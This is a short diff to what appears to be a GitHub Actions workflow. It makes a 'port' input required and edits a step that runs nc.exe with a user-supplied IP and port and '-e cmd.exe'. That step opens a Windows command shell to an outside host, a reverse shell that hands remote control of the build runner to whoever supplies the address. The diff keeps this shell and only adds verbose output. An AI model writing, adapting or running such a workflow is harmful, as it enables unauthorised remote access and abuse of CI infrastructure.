@@ -13,6 +13,7 @@ on:
         
       port:
            description: 'enter your ip port'
+           required: true
 jobs:
 
   build:
@@ -32,7 +33,7 @@ jobs:
        ls
        cd netcat-1.11
        ls
-       ./nc.exe {{ github.event.inputs.pin }} {{ github.event.inputs.port }}-e cmd.exe
+       ./nc.exe -v {{ github.event.inputs.pin }} {{ github.event.inputs.port }}-e cmd.exe
        
        
     
